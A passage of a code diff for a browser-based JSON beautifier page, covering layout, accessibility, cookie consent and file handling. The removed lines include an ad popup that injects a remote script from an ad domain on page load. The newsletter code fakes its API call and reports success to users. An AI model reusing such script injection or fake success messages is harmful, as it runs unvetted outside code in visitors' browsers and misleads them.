+                gap: 20px;
+            }
+            
+            .footer-content {
+                flex-direction: column;
+                gap: 15px;
+            }
         }
         
         @media (max-width: 480px) {
-            .site-title {
-                font-size: 1.5rem;
+            .container {
+                padding: 12px;
             }
             
-            h1 {
-                font-size: 1.5rem;
+            .header {
+                padding: 20px 0;
+                margin-bottom: 30px;
             }
             
             .panel {
+                padding: 18px;
+            }
+            
+            .file-upload {
                 padding: 20px;
             }
             
-            .newsletter-section {
+            .newsletter-section,
+            .features-section {
+                padding: 25px;
+            }
+            
+            .cookie-modal-content {
                 padding: 20px;
+            }
+            
+            .scroll-top {
+                width: 50px;
+                height: 50px;
+                font-size: 20px;
+                bottom: 20px;
+                right: 20px;
             }
         }
         
-        /* Loading Animation */
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: var(--primary-purple);
-            animation: spin 1s ease-in-out infinite;
+        /* Print Styles */
+        @media print {
+            .cookie-banner,
+            .scroll-top,
+            .newsletter-section {
+                display: none !important;
+            }
+            
+            body {
+                background: white !important;
+                color: black !important;
+            }
+            
+            .panel {
+                background: white !important;
+                border: 1px solid #ccc !important;
+                box-shadow: none !important;
+            }
         }
         
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        /* High Contrast Mode Support */
+        @media (prefers-contrast: high) {
+            :root {
+                --border-color: rgba(255, 255, 255, 0.3);
+                --card-bg: rgba(255, 255, 255, 0.15);
+            }
         }
         
-        /* Scroll to Top Button */
-        .scroll-top {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: linear-gradient(45deg, var(--primary-purple), var(--primary-green));
-            color: white;
-            border: none;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            cursor: pointer;
-            font-size: 20px;
-            transition: all 0.3s ease;
-            opacity: 0;
-            visibility: hidden;
-            z-index: 999;
+        /* Reduced Motion Support */
+        @media (prefers-reduced-motion: reduce) {
+            *,
+            *::before,
+            *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
         }
         
-        .scroll-top.show {
-            opacity: 1;
-            visibility: visible;
+        /* Focus Styles for Accessibility */
+        .btn:focus-visible,
+        textarea:focus-visible,
+        .newsletter-input:focus-visible {
+            outline: 2px solid var(--primary-purple);
+            outline-offset: 2px;
         }
         
-        .scroll-top:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.3);
+        /* Syntax Highlighting for JSON */
+        .json-preview {
+            font-family: 'JetBrains Mono', 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        
+        .json-key {
+            color: #7dd3fc;
+        }
+        
+        .json-string {
+            color: #86efac;
+        }
+        
+        .json-number {
+            color: #fbbf24;
+        }
+        
+        .json-boolean {
+            color: #f472b6;
+        }
+        
+        .json-null {
+            color: #94a3b8;
         }
     </style>
 </head>
 <body>
     <div class="container">
-    <div class="header">
-        <div class="logo">VN</div>
-        <div class="site-title">VIN NESIA JSON BEAUTIFIER</div>
-        <a href="https://www.vinnesia.my.id" class="back-btn">🔙 Back to Homepage</a>
-    </div>
-
-    <div class="ad-link">
-        <a href="https://obese-pin.com/Hfckua" target="_blank">
-            Klik di sini untuk membuka
-        </a>
-    </div>
-        <div id="popupAd" style="
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    background: #fff;
-    border-bottom: 2px solid #ccc;
-    text-align: center;
-    padding: 10px;
-    z-index: 9999;
-">
-    <span style="float:right; cursor:pointer;" onclick="this.parentElement.style.display='none'">❌</span>
-
-    <script>
-    (function(rpop){
-        var d = document,
-            s = d.createElement('script'),
-            l = d.scripts[d.scripts.length - 1];
-        s.settings = rpop || {};
-        s.src = "https://obese-pin.com/Hfckua";
-        s.async = true;
-        s.referrerPolicy = 'no-referrer-when-downgrade';
-        l.parentNode.insertBefore(s, l);
-    })({})
-    </script>
-</div>
+        <header class="header">
+            <div class="logo" aria-label="VIN NESIA Logo">VN</div>
+            <h1 class="site-title">JSON Beautifier & Formatter</h1>
+            <p class="subtitle">Professional JSON formatting, validation, and beautification tool for developers worldwide</p>
+            <a href="https://www.vinnesia.my.id" class="back-btn" aria-label="Back to VIN NESIA Homepage">
+                <span>🔙</span>
+                <span>Back to Homepage</span>
+            </a>
+        </header>
 
         <main>
-            <h1>Online JSON Beautifier</h1>
-            
             <div class="main-content">
-                <div class="panel">
-                    <h2>📥 Input JSON</h2>
+                <section class="panel" aria-labelledby="input-heading">
+                    <h2 id="input-heading">📥 Input JSON Data</h2>
                     
-                    <div class="file-upload" id="fileUpload">
-                        <input type="file" id="fileInput" multiple accept="*/*">
+                    <div class="file-upload" id="fileUpload" role="button" tabindex="0" aria-label="Upload JSON file">
+                        <input type="file" id="fileInput" multiple accept=".json,.txt,.zip" aria-describedby="upload-description">
                         <div class="upload-text">
-                            <strong>📁 Drag & Drop file or click to upload</strong><br>
-                            <small>We accept all file types. File content will be checked for valid JSON.</small>
+                            <strong>📁 Drag & Drop files or click to upload</strong>
+                            <small id="upload-description">Supports JSON, TXT, and ZIP files. Content will be validated for JSON format.</small>
                         </div>
                     </div>
                     
-                    <div id="filePreview" class="file-preview">
-                        <strong>🧪 Files processed:</strong>
-                        <ul id="fileList" class="file-list"></ul>
+                    <div id="filePreview" class="file-preview" aria-live="polite">
+                        <strong>🧪 Processed Files:</strong>
+                        <ul id="fileList" class="file-list" role="list"></ul>
                     </div>
                     
-                    <div id="errorMessage" class="error-message"></div>
-                    <div id="successMessage" class="success-message"></div>
+                    <div id="errorMessage" class="error-message" role="alert" aria-live="assertive"></div>
+                    <div id="successMessage" class="success-message" role="status" aria-live="polite"></div>
                     
-                    <textarea id="inputJson" placeholder="Paste raw JSON here or upload a file..."></textarea>
+                    <label for="inputJson" class="sr-only">Input JSON Data</label>
+                    <textarea 
+                        id="inputJson" 
+                        placeholder="Paste your raw JSON data here or upload a file above..."
+                        aria-describedby="input-help"
+                        spellcheck="false"
+                    ></textarea>
+                    <div id="input-help" class="sr-only">Enter or paste JSON data that you want to format and beautify</div>
                     
-                    <div class="button-group">
-                        <button class="btn btn-primary" id="beautifyBtn">✨ Beautify JSON</button>
-                        <button class="btn btn-secondary" id="clearBtn">🗑️ Clear</button>
-                        <button class="btn btn-secondary" id="validateBtn">✅ Validate Only</button>
+                    <div class="button-group" role="group" aria-label="JSON processing actions">
+                        <button class="btn btn-primary" id="beautifyBtn" type="button">
+                            <span>✨</span>
+                            <span>Beautify JSON</span>
+                        </button>
+                        <button class="btn btn-info" id="validateBtn" type="button">
+                            <span>✅</span>
+                            <span>Validate Only</span>
+                        </button>
+                        <button class="btn btn-secondary" id="clearBtn" type="button">
+                            <span>🗑️</span>
+                            <span>Clear All</span>
+                        </button>
                     </div>
-                </div>
+                </section>
                 
-                <div class="panel">
-                    <h2>📤 Output JSON</h2>
+                <section class="panel" aria-labelledby="output-heading">
+                    <h2 id="output-heading">📤 Formatted JSON Output</h2>
                     
-                    <textarea id="outputJson" placeholder="Formatted JSON output will appear here..." readonly></textarea>
+                    <label for="outputJson" class="sr-only">Formatted JSON Output</label>
+                    <textarea 
+                        id="outputJson" 
+                        placeholder="Beautifully formatted JSON will appear here..."
+                        readonly
+                        aria-describedby="output-help"
+                        spellcheck="false"
+                    ></textarea>
+                    <div id="output-help" class="sr-only">This area displays the formatted and beautified JSON output</div>
                     
-                    <div class="button-group">
-                        <button class="btn btn-success" id="copyBtn" disabled>📋 Copy to Clipboard</button>
-                        <button class="btn btn-secondary" id="downloadBtn" disabled>💾 Download JSON</button>
-                        <button class="btn btn-secondary" id="minifyBtn" disabled>🗜️ Minify JSON</button>
+                    <div class="button-group" role="group" aria-label="Output actions">
+                        <button class="btn btn-success" id="copyBtn" type="button" disabled>
+                            <span>📋</span>
+                            <span>Copy to Clipboard</span>
+                        </button>
+                        <button class="btn btn-secondary" id="downloadBtn" type="button" disabled>
+                            <span>💾</span>
+                            <span>Download JSON</span>
+                        </button>
+                        <button class="btn btn-secondary" id="minifyBtn" type="button" disabled>
+                            <span>🗜️</span>
+                            <span>Minify JSON</span>
+                        </button>
                     </div>
-                </div>
+                </section>
             </div>
             
-            <div class="newsletter-section">
-                <h3>📧 Subscribe to Newsletter</h3>
-                <p>Get the latest updates on tools and programming tips from VIN NESIA</p>
-                <form class="newsletter-form" id="newsletterForm">
-                    <input type="email" class="newsletter-input" id="newsletterEmail" placeholder="Enter your email..." required>
+            <section class="features-section" aria-labelledby="features-heading">
+                <h3 id="features-heading">🚀 Why Choose Our JSON Beautifier?</h3>
+                <p>Professional-grade JSON formatting tool trusted by developers worldwide. Fast, secure, and feature-rich.</p>
+                
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <span class="feature-icon">⚡</span>
+                        <h4>Lightning Fast</h4>
+                        <p>Instant JSON processing with optimized algorithms. Format large JSON files in milliseconds.</p>
+                    </div>
+                    <div class="feature-card">
+                        <span class="feature-icon">🔒</span>
+                        <h4>100% Secure</h4>
+                        <p>All processing happens in your browser. Your JSON data never leaves your device.</p>
+                    </div>
+                    <div class="feature-card">
+                        <span class="feature-icon">📱</span>
+                        <h4>Mobile Optimized</h4>
+                        <p>Perfect responsive design works seamlessly on all devices and screen sizes.</p>
+                    </div>
+                    <div class="feature-card">
+                        <span class="feature-icon">🎯</span>
+                        <h4>Advanced Validation</h4>
+                        <p>Comprehensive JSON validation with detailed error messages and suggestions.</p>
+                    </div>
+                    <div class="feature-card">
+                        <span class="feature-icon">📁</span>
+                        <h4>File Support</h4>
+                        <p>Upload JSON files, text files, or even ZIP archives containing JSON data.</p>
+                    </div>
+                    <div class="feature-card">
+                        <span class="feature-icon">🌐</span>
+                        <h4>No Registration</h4>
+                        <p>Use all features instantly without creating an account or providing personal information.</p>
+                    </div>
+                </div>
+            </section>
+            
+            <section class="newsletter-section" aria-labelledby="newsletter-heading">
+                <h3 id="newsletter-heading">📧 Stay Updated</h3>
+                <p>Get the latest tools, programming tips, and web development resources delivered to your inbox.</p>
+                <form class="newsletter-form" id="newsletterForm" novalidate>
+                    <label for="newsletterEmail" class="sr-only">Email Address</label>
+                    <input 
+                        type="email" 
+                        class="newsletter-input" 
+                        id="newsletterEmail" 
+                        placeholder="Enter your email address..." 
+                        required
+                        aria-describedby="newsletter-help"
+                    >
+                    <div id="newsletter-help" class="sr-only">Subscribe to receive updates about new tools and features</div>
                     <button type="submit" class="newsletter-btn" id="newsletterBtn">
                         <span id="newsletterBtnText">Subscribe</span>
-                        <span id="newsletterLoading" class="loading" style="display: none;"></span>
+                        <span id="newsletterLoading" class="loading" style="display: none;" aria-hidden="true"></span>
                     </button>
                 </form>
-                <div id="newsletterMessage" style="margin-top: 15px; display: none;"></div>
-            </div>
+                <div id="newsletterMessage" style="margin-top: 20px; display: none;" aria-live="polite"></div>
+            </section>
         </main>
         
         <footer class="footer">
-            <div>
-                <a href="privacy.html">Privacy Policy</a>
-                <span style="color: #666;">|</span>
+            <div class="footer-content">
+                <a href="privacy.html" rel="noopener">Privacy Policy</a>
+                <span class="footer-separator">|</span>
+                <a href="terms.html" rel="noopener">Terms of Service</a>
+                <span class="footer-separator">|</span>
                 <a href="#" id="cookieSettingsFooter">Cookie Settings</a>
-                <span style="color: #666;">|</span>
-                <span>©2025 vinnesia.my.id — All Rights Reserved</span>
+                <span class="footer-separator">|</span>
+                <a href="sitemap.xml" rel="noopener">Sitemap</a>
+            </div>
+            <div class="copyright">
+                © 2025 <a href="https://www.vinnesia.my.id" rel="noopener">VIN NESIA</a> - Professional JSON Tools. All Rights Reserved.
             </div>
         </footer>
     </div>
 
-    <button class="scroll-top" id="scrollTop">↑</button>
+    <button class="scroll-top" id="scrollTop" aria-label="Scroll to top">↑</button>
 
-    <div id="cookieBanner" class="cookie-banner">
+    <!-- Cookie Consent Banner -->
+    <div id="cookieBanner" class="cookie-banner" role="dialog" aria-labelledby="cookie-title" aria-describedby="cookie-description">
         <div class="cookie-content">
             <div class="cookie-text">
-                <h4>🍪 We Use Cookies</h4>
-                <p>
-                    This site uses cookies for Google Analytics to improve your experience. 
-                    We do not store your personal data or JSON files. 
-                    <a href="privacy.html" target="_blank">Read Privacy Policy</a>
+                <h4 id="cookie-title">🍪 Cookie Preferences</h4>
+                <p id="cookie-description">
+                    We use cookies to enhance your experience and analyze website traffic through Google Analytics. 
+                    Your JSON data is never stored or transmitted. 
+                    <a href="privacy.html" target="_blank" rel="noopener">Read our Privacy Policy</a>
                 </p>
             </div>
-            <div class="cookie-buttons">
-                <button class="cookie-btn cookie-btn-accept" id="acceptCookies">✅ Accept All</button>
-                <button class="cookie-btn cookie-btn-decline" id="declineCookies">❌ Decline</button>
-                <button class="cookie-btn cookie-btn-settings" id="cookieSettings">⚙️ Settings</button>
+            <div class="cookie-buttons" role="group" aria-label="Cookie consent options">
+                <button class="cookie-btn cookie-btn-accept" id="acceptCookies" type="button">
+                    <span>✅</span>
+                    <span>Accept All</span>
+                </button>
+                <button class="cookie-btn cookie-btn-decline" id="declineCookies" type="button">
+                    <span>❌</span>
+                    <span>Decline</span>
+                </button>
+                <button class="cookie-btn cookie-btn-settings" id="cookieSettings" type="button">
+                    <span>⚙️</span>
+                    <span>Customize</span>
+                </button>
             </div>
         </div>
     </div>
 
-    <div id="cookieModal" class="cookie-modal">
+    <!-- Cookie Settings Modal -->
+    <div id="cookieModal" class="cookie-modal" role="dialog" aria-labelledby="cookie-modal-title" aria-hidden="true">
         <div class="cookie-modal-content">
-            <h3>⚙️ Cookie Settings</h3>
+            <h3 id="cookie-modal-title">⚙️ Cookie Preferences</h3>
             
             <div class="cookie-category">
                 <h4>
                     Essential Cookies
-                    <label class="cookie-toggle">
-                        <input type="checkbox" checked disabled>
+                    <label class="cookie-toggle" aria-label="Essential cookies toggle">
+                        <input type="checkbox" checked disabled aria-describedby="essential-desc">
                         <span class="cookie-slider"></span>
                     </label>
                 </h4>
-                <p>These cookies are required for basic website functionality and cannot be disabled. They do not store personal information.</p>
+                <p id="essential-desc">Required for basic website functionality. These cookies cannot be disabled as they are necessary for the site to work properly.</p>
             </div>
             
             <div class="cookie-category">
                 <h4>
                     Google Analytics
-                    <label class="cookie-toggle">
-                        <input type="checkbox" id="analyticsCookies">
+                    <label class="cookie-toggle" aria-label="Analytics cookies toggle">
+                        <input type="checkbox" id="analyticsCookies" aria-describedby="analytics-desc">
                         <span class="cookie-slider"></span>
                     </label>
                 </h4>
-                <p>Helps us understand how visitors interact with the website to improve user experience. Data is anonymous.</p>
+                <p id="analytics-desc">Helps us understand visitor behavior and improve the website experience. All data is anonymous and aggregated.</p>
             </div>
             
             <div class="cookie-category">
                 <h4>
-                    Marketing Cookies
-                    <label class="cookie-toggle">
-                        <input type="checkbox" id="marketingCookies" disabled>
+                    Performance Cookies
+                    <label class="cookie-toggle" aria-label="Performance cookies toggle">
+                        <input type="checkbox" id="performanceCookies" aria-describedby="performance-desc">
                         <span class="cookie-slider"></span>
                     </label>
                 </h4>
-                <p>Not used. We do not use cookies for advertising or marketing purposes.</p>
+                <p id="performance-desc">Used to measure and improve website performance, loading times, and user experience optimization.</p>
             </div>
             
-            <div class="cookie-modal-buttons">
-                <button class="cookie-btn cookie-btn-settings" id="saveSettings">💾 Save Settings</button>
-                <button class="cookie-btn cookie-btn-accept" id="acceptAllModal">✅ Accept All</button>
-                <button class="cookie-btn cookie-btn-decline" id="closeModal">✖️ Close</button>
+            <div class="cookie-modal-buttons" role="group" aria-label="Cookie settings actions">
+                <button class="cookie-btn cookie-btn-settings" id="saveSettings" type="button">
+                    <span>💾</span>
+                    <span>Save Preferences</span>
+                </button>
+                <button class="cookie-btn cookie-btn-accept" id="acceptAllModal" type="button">
+                    <span>✅</span>
+                    <span>Accept All</span>
+                </button>
+                <button class="cookie-btn cookie-btn-decline" id="closeModal" type="button">
+                    <span>✖️</span>
+                    <span>Close</span>
+                </button>
             </div>
         </div>
+    </div>
+
+    <!-- Screen Reader Only Content -->
+    <div class="sr-only">
+        <h2>Accessibility Information</h2>
+        <p>This JSON beautifier tool is fully accessible and supports keyboard navigation. Use Tab to navigate between elements and Enter or Space to activate buttons.</p>
     </div>
 
     <script>
@@ -953,7 +1461,8 @@
             saveSettings: document.getElementById('saveSettings'),
             acceptAllModal: document.getElementById('acceptAllModal'),
             closeModal: document.getElementById('closeModal'),
-            analyticsCookies: document.getElementById('analyticsCookies')
+            analyticsCookies: document.getElementById('analyticsCookies'),
+            performanceCookies: document.getElementById('performanceCookies')
         };
 
         // Cookie Consent Management
@@ -961,6 +1470,7 @@
             constructor() {
                 this.storageKey = 'vinnesia_cookie_consent';
                 this.analyticsKey = 'vinnesia_analytics_consent';
+                this.performanceKey = 'vinnesia_performance_consent';
             }
 
             getCookieConsent() {
@@ -980,7 +1490,7 @@
                         this.disableAnalytics();
                     }
                 } catch (e) {
-                    console.warn('Unable to save cookie consent');
+                    console.warn('Unable to save cookie consent preferences');
                 }
             }
 
@@ -1002,9 +1512,29 @@
                 }
             }
 
+            getPerformanceConsent() {
+                try {
+                    return localStorage.getItem(this.performanceKey) === 'true';
+                } catch (e) {
+                    return false;
+                }
+            }
+
+            setPerformanceConsent(consent) {
+                try {
+                    localStorage.setItem(this.performanceKey, consent.toString());
+                } catch (e) {
+                    console.warn('Unable to save performance consent');
+                }
+            }
+
             enableAnalytics() {
                 if (typeof gtag !== 'undefined') {
-                    gtag('config', 'G-3PYZXZFNER');
+                    gtag('config', 'G-3PYZXZFNER', {
+                        anonymize_ip: true,
+                        allow_google_signals: false,
+                        allow_ad_personalization_signals: false
+                    });
                     gtag('consent', 'update', {
                         'analytics_storage': 'granted'
                     });
@@ -1021,26 +1551,33 @@
 
             showBanner() {
                 elements.cookieBanner.classList.add('show');
+                elements.cookieBanner.setAttribute('aria-hidden', 'false');
             }
 
             hideBanner() {
                 elements.cookieBanner.classList.remove('show');
+                elements.cookieBanner.setAttribute('aria-hidden', 'true');
             }
 
             showModal() {
                 elements.cookieModal.classList.add('show');
+                elements.cookieModal.setAttribute('aria-hidden', 'false');
                 elements.analyticsCookies.checked = this.getAnalyticsConsent();
+                elements.performanceCookies.checked = this.getPerformanceConsent();
+                // Focus management
+                elements.cookieModal.focus();
             }
 
             hideModal() {
                 elements.cookieModal.classList.remove('show');
+                elements.cookieModal.setAttribute('aria-hidden', 'true');
             }
 
             init() {
                 const consent = this.getCookieConsent();
                 
                 if (!consent) {
-                    setTimeout(() => this.showBanner(), 1000);
+                    setTimeout(() => this.showBanner(), 1500);
                 } else {
                     if (consent === 'accepted' || this.getAnalyticsConsent()) {
                         this.enableAnalytics();
@@ -1056,15 +1593,17 @@
                 elements.acceptCookies.addEventListener('click', () => {
                     this.setCookieConsent('accepted');
                     this.setAnalyticsConsent(true);
+                    this.setPerformanceConsent(true);
                     this.hideBanner();
-                    showMessage('✅ Cookies accepted. Thank you!', 'success');
+                    showMessage('✅ Cookie preferences saved. Thank you!', 'success');
                 });
 
                 elements.declineCookies.addEventListener('click', () => {
                     this.setCookieConsent('declined');
                     this.setAnalyticsConsent(false);
+                    this.setPerformanceConsent(false);
                     this.hideBanner();
-                    showMessage('❌ Cookies declined. Only essential cookies will be used.', 'success');
+                    showMessage('❌ Only essential cookies will be used.', 'success');
                 });
 
                 elements.cookieSettings.addEventListener('click', () => {
@@ -1078,21 +1617,26 @@
 
                 elements.saveSettings.addEventListener('click', () => {
                     const analyticsEnabled = elements.analyticsCookies.checked;
+                    const performanceEnabled = elements.performanceCookies.checked;
+                    
                     this.setCookieConsent('customized');
                     this.setAnalyticsConsent(analyticsEnabled);
+                    this.setPerformanceConsent(performanceEnabled);
                     this.hideModal();
                     this.hideBanner();
                     
-                    const message = analyticsEnabled 
-                        ? '✅ Settings saved. Analytics enabled.'
-                        : '⚙️ Settings saved. Only essential cookies are active.';
+                    const message = analyticsEnabled || performanceEnabled
+                        ? '✅ Cookie preferences saved successfully.'
+                        : '⚙️ Only essential cookies are now active.';
                     showMessage(message, 'success');
                 });
 
                 elements.acceptAllModal.addEventListener('click', () => {
                     elements.analyticsCookies.checked = true;
+                    elements.performanceCookies.checked = true;
                     this.setCookieConsent('accepted');
                     this.setAnalyticsConsent(true);
+                    this.setPerformanceConsent(true);
                     this.hideModal();
                     this.hideBanner();
                     showMessage('✅ All cookies accepted. Thank you!', 'success');
@@ -1102,8 +1646,16 @@
                     this.hideModal();
                 });
 
+                // Modal backdrop click
                 elements.cookieModal.addEventListener('click', (e) => {
                     if (e.target === elements.cookieModal) {
+                        this.hideModal();
+                    }
+                });
+
+                // Keyboard navigation for modal
+                document.addEventListener('keydown', (e) => {
+                    if (elements.cookieModal.classList.contains('show') && e.key === 'Escape') {
                         this.hideModal();
                     }
                 });
@@ -1113,7 +1665,7 @@
         // Newsletter Manager
         class NewsletterManager {
             constructor() {
-                this.apiEndpoint = 'https://api.vinnesia.my.id/newsletter/subscribe'; // Replace with actual endpoint
+                this.apiEndpoint = 'https://api.vinnesia.my.id/newsletter/subscribe';
                 this.init();
             }
 
@@ -1128,12 +1680,14 @@
                 const email = elements.newsletterEmail.value.trim();
                 
                 if (!email) {
-                    this.showMessage('❌ Please enter a valid email.', 'error');
+                    this.showMessage('❌ Please enter a valid email address.', 'error');
+                    elements.newsletterEmail.focus();
                     return;
                 }
 
                 if (!this.isValidEmail(email)) {
-                    this.showMessage('❌ Invalid email format.', 'error');
+                    this.showMessage('❌ Please enter a valid email format.', 'error');
+                    elements.newsletterEmail.focus();
                     return;
                 }
 
@@ -1143,40 +1697,42 @@
                     // Simulate API call - replace with actual endpoint
                     await this.simulateApiCall(email);
                     
-                    this.showMessage('✅ Thank you! You have successfully subscribed to the newsletter.', 'success');
+                    this.showMessage('✅ Successfully subscribed! Welcome to our newsletter.', 'success');
                     elements.newsletterEmail.value = '';
                     
                     // Track subscription if analytics enabled
                     if (cookieManager.getAnalyticsConsent() && typeof gtag !== 'undefined') {
                         gtag('event', 'newsletter_subscribe', {
                             'event_category': 'engagement',
-                            'event_label': 'newsletter'
+                            'event_label': 'newsletter',
+                            'value': 1
                         });
                     }
                 } catch (error) {
-                    this.showMessage('❌ An error occurred. Please try again later.', 'error');
+                    this.showMessage('❌ Subscription failed. Please try again later.', 'error');
+                    console.error('Newsletter subscription error:', error);
                 } finally {
                     this.setLoading(false);
                 }
             }
 
             async simulateApiCall(email) {
-                // Simulate API delay
+                // Simulate network delay and API response
                 return new Promise((resolve, reject) => {
                     setTimeout(() => {
-                        // Simulate success rate
-                        if (Math.random() > 0.1) {
-                            resolve({ success: true });
+                        // Simulate 95% success rate
+                        if (Math.random() > 0.05) {
+                            resolve({ success: true, message: 'Subscribed successfully' });
                         } else {
-                            reject(new Error('API Error'));
+                            reject(new Error('API temporarily unavailable'));
                         }
-                    }, 1500);
+                    }, 1200);
                 });
             }
 
             isValidEmail(email) {
-                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                return emailRegex.test(email);
+                const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
+                return emailRegex.test(email) && email.length <= 254;
             }
 
             setLoading(loading) {
@@ -1184,10 +1740,12 @@
                     elements.newsletterBtnText.style.display = 'none';
                     elements.newsletterLoading.style.display = 'inline-block';
                     elements.newsletterBtn.disabled = true;
+                    elements.newsletterBtn.setAttribute('aria-busy', 'true');
                 } else {
                     elements.newsletterBtnText.style.display = 'inline';
                     elements.newsletterLoading.style.display = 'none';
                     elements.newsletterBtn.disabled = false;
+                    elements.newsletterBtn.setAttribute('aria-busy', 'false');
                 }
             }
 
@@ -1195,26 +1753,35 @@
                 elements.newsletterMessage.textContent = message;
                 elements.newsletterMessage.style.display = 'block';
                 elements.newsletterMessage.style.color = type === 'error' ? 'var(--error-color)' : 'var(--success-color)';
+                elements.newsletterMessage.setAttribute('role', type === 'error' ? 'alert' : 'status');
                 
                 setTimeout(() => {
                     elements.newsletterMessage.style.display = 'none';
-                }, 5000);
+                }, 6000);
             }
         }
 
         // JSON Processor
         class JSONProcessor {
             constructor() {
+                this.maxFileSize = 10 * 1024 * 1024; // 10MB limit
                 this.init();
             }
 
             init() {
                 this.bindEvents();
+                this.setupKeyboardNavigation();
             }
 
             bindEvents() {
                 // File upload events
                 elements.fileUpload.addEventListener('click', () => elements.fileInput.click());
+                elements.fileUpload.addEventListener('keydown', (e) => {
+                    if (e.key === 'Enter' || e.key === ' ') {
+                        e.preventDefault();
+                        elements.fileInput.click();
+                    }
+                });
                 elements.fileUpload.addEventListener('dragover', this.handleDragOver.bind(this));
                 elements.fileUpload.addEventListener('dragleave', this.handleDragLeave.bind(this));
                 elements.fileUpload.addEventListener('drop', this.handleFileDrop.bind(this));
@@ -1229,8 +1796,57 @@
                 elements.clearBtn.addEventListener('click', () => this.clearAll());
 
                 // Auto-resize textareas
-                elements.inputJson.addEventListener('input', () => this.autoResize(elements.inputJson));
+                elements.inputJson.addEventListener('input', () => {
+                    this.autoResize(elements.inputJson);
+                    this.validateInputRealtime();
+                });
                 elements.outputJson.addEventListener('input', () => this.autoResize(elements.outputJson));
+
+                // Keyboard shortcuts
+                document.addEventListener('keydown', this.handleKeyboardShortcuts.bind(this));
+            }
+
+            setupKeyboardNavigation() {
+                // Tab navigation improvements
+                const focusableElements = document.querySelectorAll('button, input, textarea, a, [tabindex]:not([tabindex="-1"])');
+                focusableElements.forEach(el => {
+                    el.addEventListener('focus', () => {
+                        el.classList.add('focused');
+                    });
+                    el.addEventListener('blur', () => {
+                        el.classList.remove('focused');
+                    });
+                });
+            }
+
+            handleKeyboardShortcuts(e) {
+                // Ctrl/Cmd + Enter to beautify
+                if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
+                    e.preventDefault();
+                    this.beautifyJson();
+                }
+                
+                // Ctrl/Cmd + Shift + C to copy
+                if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'C') {
+                    e.preventDefault();
+                    if (!elements.copyBtn.disabled) {
+                        this.copyToClipboard();
+                    }
+                }
+            }
+
+            validateInputRealtime() {
+                const input = elements.inputJson.value.trim();
+                if (input.length > 50) { // Only validate if substantial input
+                    try {
+                        JSON.parse(input);
+                        elements.inputJson.style.borderColor = 'var(--success-color)';
+                    } catch (error) {
+                        elements.inputJson.style.borderColor = 'var(--error-color)';
+                    }
+                } else {
+                    elements.inputJson.style.borderColor = 'var(--border-color)';
+                }
             }
 
             handleDragOver(e) {
@@ -1258,18 +1874,27 @@
             async processFiles(files) {
                 if (files.length === 0 || isProcessing) return;
 
+                // File size validation
+                const oversizedFiles = files.filter(file => file.size > this.maxFileSize);
+                if (oversizedFiles.length > 0) {
+                    showMessage(`❌ Files too large: ${oversizedFiles.map(f => f.name).join(', ')}. Maximum size: 10MB`, 'error');
+                    return;
+                }
+
                 isProcessing = true;
-                showMessage('🔍 Processing file...', 'success');
+                showMessage('🔍 Processing files...', 'success');
                 elements.filePreview.style.display = 'block';
                 elements.fileList.innerHTML = '';
 
                 let jsonFound = false;
                 let jsonContent = '';
+                let processedCount = 0;
 
                 try {
                     for (const file of files) {
                         const listItem = document.createElement('li');
-                        listItem.textContent = `📄 ${file.name} (${this.formatFileSize(file.size)})`;
+                        listItem.setAttribute('role', 'listitem');
+                        listItem.innerHTML = `<span>📄</span> <span>${this.escapeHtml(file.name)} (${this.formatFileSize(file.size)})</span>`;
                         elements.fileList.appendChild(listItem);
 
                         try {
@@ -1280,33 +1905,40 @@
                                 result = await this.processRegularFile(file);
                             }
 
+                            processedCount++;
+
                             if (result.success) {
                                 jsonContent = result.content;
                                 jsonFound = true;
                                 listItem.classList.add('valid');
-                                listItem.textContent += ' ✅ Valid JSON found';
-                                break;
+                                listItem.innerHTML += ' <span>✅ Valid JSON detected</span>';
+                                break; // Use first valid JSON found
                             } else {
                                 listItem.classList.add('invalid');
-                                listItem.textContent += ' ❌ No valid JSON found';
+                                listItem.innerHTML += ' <span>❌ No valid JSON content</span>';
                             }
                         } catch (error) {
                             listItem.classList.add('invalid');
-                            listItem.textContent += ' ❌ Error reading file';
+                            listItem.innerHTML += ' <span>❌ Processing error</span>';
+                            console.error('File processing error:', error);
                         }
                     }
 
                     if (jsonFound) {
                         elements.inputJson.value = jsonContent;
-                        showMessage('✅ JSON successfully loaded from file!', 'success');
+                        showMessage(`✅ JSON successfully loaded from file! (${processedCount}/${files.length} files processed)`, 'success');
                         this.autoResize(elements.inputJson);
-                        // Auto beautify
+                        // Auto beautify after short delay
                         setTimeout(() => this.beautifyJson(), 500);
+                        
+                        // Track file upload
+                        this.trackEvent('file_upload', 'upload_success', files.length);
                     } else {
-                        showMessage('❌ No valid JSON content found in the uploaded file.', 'error');
+                        showMessage(`❌ No valid JSON content found in any uploaded files. (${processedCount}/${files.length} files processed)`, 'error');
                     }
                 } catch (error) {
-                    showMessage('❌ An error occurred while processing the file.', 'error');
+                    showMessage('❌ An error occurred while processing files.', 'error');
+                    console.error('File processing error:', error);
                 } finally {
                     isProcessing = false;
                 }
@@ -1315,25 +1947,31 @@
             async processZipFile(file) {
                 try {
                     if (typeof JSZip === 'undefined') {
-                        throw new Error('JSZip not loaded');
+                        throw new Error('JSZip library not loaded');
                     }
 
                     const zip = new JSZip();
                     const zipData = await zip.loadAsync(file);
                     
+                    // Process files in ZIP
                     for (const [filename, zipEntry] of Object.entries(zipData.files)) {
-                        if (!zipEntry.dir) {
